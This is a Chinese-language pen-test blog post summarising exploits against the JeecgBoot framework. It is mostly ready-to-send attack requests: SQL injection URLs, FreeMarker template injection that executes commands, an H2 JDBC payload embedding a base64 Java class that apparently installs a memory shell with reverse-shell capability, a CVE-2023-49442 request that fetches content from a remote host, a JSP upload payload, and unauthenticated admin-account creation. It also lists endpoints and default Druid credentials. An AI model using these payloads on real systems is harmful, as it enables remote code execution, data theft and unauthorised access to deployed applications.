---
layout: post
title: Jeecg boot利用总结
categories: [pen-test]
Description: Jeecg boot利用总结
keywords: Pen-test JeecgBoot
mermaid: false
sequence: false
flow: false
mathjax: false
mindmap: false
mindmap2: false
---

Description: Jeecg Boot.

## SQL Injection

### /sys/duplicate/check

poc：

```
/jeecg-boot/sys/duplicate/check?dataId=&fieldName=updatexml(1,concat(0x7e,user(),0x7e),1)&fieldVal=1000&tableName=sys_log
```

<img src="/images/pen-test/JeecgBoot/image-20240626163646353.png" alt="image-20240626163646353" style="zoom:67%;" />

### /sys/ng-alain/getDictItemsByTable/

poc：

```
/jeecg-boot/sys/ng-alain/getDictItemsByTable/'%20from%20sys_user/*,%20'/x.js
```

<img src="/images/pen-test/JeecgBoot/image-20240625145046671.png" alt="image-20240625145046671" style="zoom:50%;" />


### /sys/dict/queryTableData

poc：

```
/jeecg-boot/sys/dict/queryTableData?pageSize=100&table=information_schema.tables&text=table_name&code=TABLE_SCHEMA
```

<img src="/images/pen-test/JeecgBoot/image-20240625154257417.png" alt="image-20240625154257417" style="zoom: 67%;" />

### /jmreport/qurestSql

poc：

```
POST /jeecg-boot/jmreport/qurestSql HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0
Content-Type: application/json;charset=UTF-8

{"apiSelectId":"1290104038414721025","id":"1' or '%1%' like (updatexml(0x3a,concat(1,(select md5(123456))),1)) or '%%' like '"}
```





## 二、RCE



### 1）/jmreport/queryFieldBySql

poc：

```
POST /jeecg-boot/jmreport/queryFieldBySql HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Type: application/json
Content-Length: 58

{"sql":"select '<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"id\") }' "}
```

<img src="/images/pen-test/JeecgBoot/image-20240625154626036.png" alt="image-20240625154626036" style="zoom:67%;" />



### 2）/jmreport/loadTableData

poc：

```
POST /jeecg-boot/jmreport/loadTableData HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
Content-Type: application/json;charset=UTF-8
Connection: close
Content-Length: 161

{"dbSource":"","sql":"select '<#assign value=\"freemarker.template.utility.Execute\"?new()>${value(\"echo 123klmsns\")}'","tableName":"test_demo);","pageNo":1,"pageSize":10}
```

<img src="/images/pen-test/JeecgBoot/image-20240625154720659.png" alt="image-20240625154720659" style="zoom:67%;" />



### 3）/jmreport/testConnection

poc：

```
POST /jmreport/testConnection HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip, deflate, br
Accept: */*
Connection: close
Host: 
Cmd: whoami
Content-Type: application/json
Content-Length: 8820

{"id": "1", "code": "ABC", "dbType": "MySQL", "dbDriver": "org.h2.Driver", "dbUrl": "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS EXEC AS 'void shellexec(String b) throws Exception {byte[] bytes\\;try{bytes=java.util.Base64.getDecoder().decode(b)\\;}catch (Exception e){e.printStackTrace()\\;bytes=javax.xml.bind.DatatypeConverter.parseBase64Binary(b)\\;}java.lang.reflect.Method defineClassMethod = java.lang.ClassLoader.class.getDeclaredMethod(\\\"defineClass\\\", byte[].class,int.class,int.class)\\;defineClassMethod.setAccessible(true)\\;Class clz=(Class)defineClassMethod.invoke(new javax.management.loading.MLet(new java.net.URL[0],java.lang.Thread.currentThread().getContextClassLoader()), bytes, 0,bytes.length)\\;clz.newInstance()\\;}'\\;CALL EXEC('yv66vgAAADEBawoAHQCSCgBEAJMKAEQAlAoAHQCVCACWCgAbAJcKAJgAmQoAmACaBwCbCgBEAJwIAIwKACAAnQgAnggAnwcAoAgAoQgAogcAowoAGwCkCAClCACmBwCnCwAWAKgLABYAqQgAqggAqwcArAoAGwCtBwCuCgCvALAIALEHALIIALMKAH4AtAoAIAC1CAC2CQAmALcHALgKACYAuQgAugoAfgC7CgAbALwIAL0HAL4KABsAvwgAwAcAwQgAwggAwwoAGwDEBwDFCgBEAMYKAMcAuwgAyAoAIADJCADKCgAgAMsIAMwKACAAzQoAIADOCADPCgAgANAIANEJAH4A0goAJgDTCgAmANQJAH4A1QcA1goARADXCgBEANgIAI0IANkKAH4A2ggA2woA3ADdCgAgAN4IAN8IAOAIAOEHAOIKAFAAkgoAUADjCADkCgBQAOUIAOYIAOcIAOgIAOkKAOoA6woA6gDsBwDtCgDuAO8KAFsA8AgA8QoAWwDyCgBbAPMKAFsA9AoA7gD1CgDuAPYKAC8A5QgA9woAIAD4CAD5CgDqAPoHAPsKACYA/AoAaQD9CgBpAO8KAO4A/goAaQD+CgBpAP8KAQABAQoBAAECCgEDAQQKAQMBBQUAAAAAAAAAMgoARAEGCgDuAQcKAGkBCAgBCQoALwEKCAELCAEMCgB+AQ0HAQ4BAAJpcAEAEkxqYXZhL2xhbmcvU3RyaW5nOwEABHBvcnQBABNMamF2YS9sYW5nL0ludGVnZXI7AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMBAAlsb2FkQ2xhc3MBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQAHZXhlY3V0ZQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAEZXhlYwEAB3JldmVyc2UBADkoTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9JbnRlZ2VyOylMamF2YS9sYW5nL1N0cmluZzsBAANydW4BAApTb3VyY2VGaWxlAQAHQTQuamF2YQwAgwCEDAEPARAMAREBEgwBEwEUAQAHdGhyZWFkcwwBFQEWBwEXDAEYARkMARoBGwEAE1tMamF2YS9sYW5nL1RocmVhZDsMARwBHQwBHgEfAQAEaHR0cAEABnRhcmdldAEAEmphdmEvbGFuZy9SdW5uYWJsZQEABnRoaXMkMAEAB2hhbmRsZXIBAB5qYXZhL2xhbmcvTm9TdWNoRmllbGRFeGNlcHRpb24MASABFAEABmdsb2JhbAEACnByb2Nlc3NvcnMBAA5qYXZhL3V0aWwvTGlzdAwBIQEiDAEaASMBAANyZXEBAAtnZXRSZXNwb25zZQEAD2phdmEvbGFuZy9DbGFzcwwBJAElAQAQamF2YS9sYW5nL09iamVjdAcBJgwBJwEoAQAJZ2V0SGVhZGVyAQAQamF2YS9sYW5nL1N0cmluZwEAA2NtZAwAigCLDAEpASoBAAlzZXRTdGF0dXMMASsBLAEAEWphdmEvbGFuZy9JbnRlZ2VyDACDAS0BACRvcmcuYXBhY2hlLnRvbWNhdC51dGlsLmJ1Zi5CeXRlQ2h1bmsMAIgAiQwBLgEvAQAIc2V0Qnl0ZXMBAAJbQgwBMAElAQAHZG9Xcml0ZQEAE2phdmEvbGFuZy9FeGNlcHRpb24BABNqYXZhLm5pby5CeXRlQnVmZmVyAQAEd3JhcAwBMQCJAQAgamF2YS9sYW5nL0NsYXNzTm90Rm91bmRFeGNlcHRpb24MATIBMwcBNAEAAAwBNQE2AQAQY29tbWFuZCBub3QgbnVsbAwBNwEdAQAFIyMjIyMMATgBOQwBOgE7AQABOgwBPAE9AQAiY29tbWFuZCByZXZlcnNlIGhvc3QgZm9ybWF0IGVycm9yIQwAfwCADAE+AT8MAUABQQwAgQCCAQAQamF2YS9sYW5nL1RocmVhZAwAgwFCDAFDAIQBAAVAQEBAQAwAjACLAQAHb3MubmFtZQcBRAwBRQCLDAFGAR0BAAN3aW4BAARwaW5nAQACLW4BABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwBRwFIAQAFIC1uIDQMAUkBHQEAAi9jAQAFIC10IDQBAAJzaAEAAi1jBwFKDAFLAUwMAIwBTQEAEWphdmEvdXRpbC9TY2FubmVyBwFODAFPAVAMAIMBUQEAAlxhDAFSAVMMAVQBVQwBVgEdDAFXAVAMAVgAhAEABy9iaW4vc2gMAIMBWQEAB2NtZC5leGUMAIwBWgEAD2phdmEvbmV0L1NvY2tldAwBWwEiDACDAVwMAV0BXgwBXwFVBwFgDAFhASIMAWIBIgcBYwwBZAEtDAFlAIQMAWYBZwwBaAEiDAFpAIQBAB1yZXZlcnNlIGV4ZWN1dGUgZXJyb3IsIG1zZyAtPgwBagEdAQABIQEAE3JldmVyc2UgZXhlY3V0ZSBvayEMAI0AjgEAAkE0AQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7AQAOZ2V0VGhyZWFkR3JvdXABABkoKUxqYXZhL2xhbmcvVGhyZWFkR3JvdXA7AQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAF2phdmEvbGFuZy9yZWZsZWN0L0ZpZWxkAQANc2V0QWNjZXNzaWJsZQEABChaKVYBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAB2dldE5hbWUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQANZ2V0U3VwZXJjbGFzcwEABHNpemUBAAMoKUkBABUoSSlMamF2YS9sYW5nL09iamVjdDsBAAlnZXRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAIZ2V0Qnl0ZXMBAAQoKVtCAQAEVFlQRQEAEUxqYXZhL2xhbmcvQ2xhc3M7AQAEKEkpVgEAC25ld0luc3RhbmNlAQAUKClMamF2YS9sYW5nL09iamVjdDsBABFnZXREZWNsYXJlZE1ldGhvZAEAB2Zvck5hbWUBABVnZXRDb250ZXh0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyAQAGZXF1YWxzAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaAQAEdHJpbQEACnN0YXJ0c1dpdGgBABUoTGphdmEvbGFuZy9TdHJpbmc7KVoBAAdyZXBsYWNlAQBEKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlO0xqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylMamF2YS9sYW5nL1N0cmluZzsBAAVzcGxpdAEAJyhMamF2YS9sYW5nL1N0cmluZzspW0xqYXZhL2xhbmcvU3RyaW5nOwEACHBhcnNlSW50AQAVKExqYXZhL2xhbmcvU3RyaW5nOylJAQAHdmFsdWVPZgEAFihJKUxqYXZhL2xhbmcvSW50ZWdlcjsBABcoTGphdmEvbGFuZy9SdW5uYWJsZTspVgEABXN0YXJ0AQAQamF2YS9sYW5nL1N5c3RlbQEAC2dldFByb3BlcnR5AQALdG9Mb3dlckNhc2UBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAAdoYXNOZXh0AQADKClaAQAEbmV4dAEADmdldEVycm9yU3RyZWFtAQAHZGVzdHJveQEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEACGludFZhbHVlAQAWKExqYXZhL2xhbmcvU3RyaW5nO0kpVgEAD2dldE91dHB1dFN0cmVhbQEAGCgpTGphdmEvaW8vT3V0cHV0U3RyZWFtOwEACGlzQ2xvc2VkAQATamF2YS9pby9J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')", "dbName": "383BAb7deFC825E6", "dbPassword": "917982", "userName": "917982"}
```





### 4）/api/../jeecgFormDemoController.do

> CVE-2023-49442

poc：

```
POST /api/../jeecgFormDemoController.do?interfaceTest= HTTP/1.1
Host: 
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
cmd: whoami
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 77

serverUrl=http://xxxxxxxx:8877/jeecg.txt&requestBody=1&requestMethod=GET
```



[](https://xz.aliyun.com/t/13283?time__1311=GqmxuD0DnD9D2ADlh%2Bt0%3DtitmQqWwqqxuipD#toc-3)







## 三、文件上传

### 1）/commonController.do?parserXml

> commonController.do接口存在任意文件上传漏洞

poc：

```
POST /api/../commonController.do?parserXml HTTP/1.1
Host: x.x.x.x
Accept-Encoding: gzip, deflate
Content-Length: 463
User-Agent: Mozilla/2.0 (compatible; MSIE 3.01; Windows 95
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarygcflwtei
Connection: close

------WebKitFormBoundarygcflwtei
Content-Disposition: form-data; "name="name"

zW9YCa.png
------WebKitFormBoundarygcflwtei
ontent-Disposition: form-data; name="documentTitle"

blank
------WebKitFormBoundarygcflwtei
Content-Disposition: form-data; name="file"; filename="zW9YCa.jsp"
Content-Type: image/png

<% out.println("HelloWorld");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
------WebKitFormBoundarygcflwtei--
```

<img src="Jeecg boot利用总结.assets/640.png" alt="图片" style="zoom:67%;" />

## 四、账号创建

前提：接口未鉴权，普通用户可创建其他账号

/sys/role/list
先查看角色id，获取角色id后构造数据包

<img src="/images/pen-test/JeecgBoot/image-20240625144345548.png" alt="image-20240625144345548" style="zoom: 67%;" />



/sys/user/add

poc：

```
POST /server/sys/user/add HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: application/json, text/plain, /
Tenant-Id: 0
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/json
Content-Length: 191

{"selectedroles":"xxxxxxx","createBy":"admin","userIdentity":"1","username":"test12345","password":"test12345","confirmpassword":"test12345","realname":"test12345"
}
```

<img src="/images/pen-test/JeecgBoot/image-20240625144518269.png" alt="image-20240625144518269" style="zoom: 67%;" />





register

```
{"username":"user123456","password":"Aa@123456","email":"QQ@qq.com","phone":"15888888888"}
```







edit

```
{"birthday":"","relTenantIds":"","activitiSync":null,"userIdentity":"1","delFlag":0,"workNo":"12345","post":"","updateBy":null,"orgCode":null,"id":"1805800489755873281","thirdType":null,"email":null,"sex":null,"telephone":null,"updateTime":null,"departIds":"","avatar":null,"realname":"test12345","createBy":"admin","phone":null,"createTime":1719371361000,"orgCodeTxt":null,"areaAuth":"","username":"test12345","status":1,"selectedroles":"f6817f48af4fb3af11b9e8bf182f618b,1803302663457083393,1782971648255750145,1320907983545327617,1802956567874650113,1803263990678163458,1802955076690526209,1782592081611485185,1803265631624105985,1782635962587705346,1803269754310365186,1802957235737870337,1803268062248439810,1782592187760930818","selecteddeparts":""}
```









## 五、接口泄露



实战收集的，不是很准，应该搭个环境收集一下

```
/sys/actuator/redis/info
/sys/actuator/redis/keysSize
/sys/actuator/redis/memoryInfo
/sys/annountCement/add
/sys/annountCement/delete
/sys/annountCement/deleteBatch
/sys/annountCement/doReleaseData
/sys/annountCement/edit
/sys/annountCement/list
/sys/annountCement/show/
/sys/category/add
/sys/category/checkCode
/sys/category/childList
/sys/category/delete
/sys/category/deleteBatch
/sys/category/edit
/sys/category/exportXls
/sys/category/getChildListBatch
/sys/category/loadTreeRoot
/sys/category/rootList
/sys/checkCaptcha
/sys/checkRule/add
/sys/checkRule/delete
/sys/checkRule/deleteBatch
/sys/checkRule/edit
/sys/checkRule/list
/sys/common/upload
/sys/dataLog/list
/sys/dataLog/queryCompareList
/sys/dataLog/queryDataVerList
/sys/dataSource/add
/sys/dataSource/delete
/sys/dataSource/deleteBatch
/sys/dataSource/edit
/sys/dataSource/list
/sys/dict/back/
/sys/dict/delete
/sys/dict/deleteList
/sys/dict/deletePhysic/
/sys/dict/list
/sys/dictItem/delete
/sys/dictItem/deleteBatch
/sys/dictItem/dictItemCheck
/sys/dictItem/list
/sys/fillRule/add
/sys/fillRule/delete
/sys/fillRule/deleteBatch
/sys/fillRule/edit
/sys/fillRule/exportXls
/sys/fillRule/importExcel
/sys/fillRule/list
/sys/fillRule/testFillRule
/sys/findEnterpriseList
/sys/gatewayRoute/clearRedis
/sys/gatewayRoute/delete
/sys/gatewayRoute/list
/sys/gatewayRoute/updateAll
/sys/getEncryptedString
/sys/log/list
/sys/message/sysMessage/add
/sys/message/sysMessage/delete
/sys/message/sysMessage/deleteBatch
/sys/message/sysMessage/edit
/sys/message/sysMessage/list
/sys/message/sysMessageTemplate/add
/sys/message/sysMessageTemplate/delete
/sys/message/sysMessageTemplate/deleteBatch
/sys/message/sysMessageTemplate/edit
/sys/message/sysMessageTemplate/list
/sys/message/sysMessageTemplate/sendMsg
/sys/online/list
/sys/oss/file/delete
/sys/oss/file/list
/sys/oss/file/upload
/sys/permission/addPermissionRule
/sys/permission/delete
/sys/permission/deleteBatch
/sys/permission/deletePermissionRule
/sys/permission/editPermissionRule
/sys/permission/getPermRuleListByPermId
/sys/permission/list
/sys/personalPhoneLogin
/sys/position/add
/sys/position/delete
/sys/position/deleteBatch
/sys/position/edit
/sys/position/exportXls
/sys/position/list
/sys/quartzJob/add
/sys/quartzJob/delete
/sys/quartzJob/deleteBatch
/sys/quartzJob/edit
/sys/quartzJob/list
/sys/quartzJob/pause
/sys/quartzJob/resume
/sys/randomImage/
/sys/role/datarule
/sys/role/delete
/sys/role/deleteBatch
/sys/role/exportXls
/sys/role/list
/sys/role/queryByCode
/sys/selectDepart
/sys/sendSms
/sys/sms
/sys/sysAnnouncementSend/getMyAnnouncementSend
/sys/sysDepart/add
/sys/sysDepart/delete
/sys/sysDepart/deleteBatch
/sys/sysDepart/edit
/sys/sysDepart/getCtnMap
/sys/sysDepart/list
/sys/sysDepart/queryTreeListByOrgCode
/sys/sysDepart/queryTreeListParam
/sys/sysDepartPermission/datarule
/sys/sysDepartRole/add
/sys/sysDepartRole/datarule
/sys/sysDepartRole/delete
/sys/sysDepartRole/deleteBatch
/sys/sysDepartRole/deptRoleUserAdd
/sys/sysDepartRole/edit
/sys/sysDepartRole/getDeptRoleByUserId
/sys/sysDepartRole/getDeptRoleList
/sys/sysDepartRole/list
/sys/sysFile/delete
/sys/sysFile/queryByBusinessId
/sys/sysUserAgent/add
/sys/sysUserAgent/edit
/sys/sysUserAgent/queryByUserName
/sys/tenant/add
/sys/tenant/delete
/sys/tenant/deleteBatch
/sys/tenant/edit
/sys/tenant/list
/sys/tenant/queryById
/sys/tenant/queryList
/sys/third/user/checkPassword
/sys/third/user/create
/sys/thirdApp/getEnabledType
/sys/thirdApp/recallMessageTest
/sys/thirdApp/sendMessageTest
/sys/thirdApp/sync/dingtalk/depart
/sys/thirdApp/sync/dingtalk/user
/sys/thirdApp/sync/wechatEnterprise/depart
/sys/thirdApp/sync/wechatEnterprise/user
/sys/thirdLogin/bindingThirdPhone
/sys/thirdLogin/oauth2/
/sys/thirdLogin/render/
/sys/upload/uploadMinio
/sys/user/addSysUserRole
/sys/user/delete
/sys/user/deleteBatch
/sys/user/deleteRecycleBin
/sys/user/deleteUserInDepart
/sys/user/deleteUserInDepartBatch
/sys/user/deleteUserRole
/sys/user/deleteUserRoleBatch
/sys/user/departUserList
/sys/user/edit
/sys/user/editSysDepartWithUser
/sys/user/exportXls
/sys/user/generateUserId
/sys/user/getById
/sys/user/list
/sys/user/passwordChange
/sys/user/phoneVerification
/sys/user/putRecycleBin
/sys/user/queryById
/sys/user/queryByIds
/sys/user/queryByOrgCodeForAddressList
/sys/user/querySysUser
/sys/user/recycleBin
/sys/user/register
/sys/user/registerDirectCar
/sys/user/selectById
/sys/user/userDepartList
/sys/user/userRoleList
/sys/cas/client/validateLogin
/sys/category/loadDictItem/
/sys/category/loadTreeData
/sys/common/static/
/sys/common/upload
/sys/dict/getDictItems/
/sys/dict/loadDict/
/sys/dict/loadDictItem/
/sys/dict/loadTreeData
/sys/getLoginQrcode
/sys/getQrcodeToken
/sys/login
/sys/logout
/sys/permission/getPermCode
/sys/permission/getUserPermissionByToken
/sys/phoneLogin
/sys/role/listByTenant
/sys/sms
/sys/switchVue3Menu
/sys/sysDepart/queryDepartTreeSync
/sys/sysDepart/queryTreeList
/sys/user/checkOnlyUser
/sys/user/getUserInfo
/sys/user/list
/sys/user/passwordChange
/sys/user/phoneVerification
/sys/user/register
/sys/user/selectUserList
```





## 六、其他

Knife4j api文档  ==》doc.html

​       druid            ==》druid/login.html       admin/123456

/actuator/httptrace





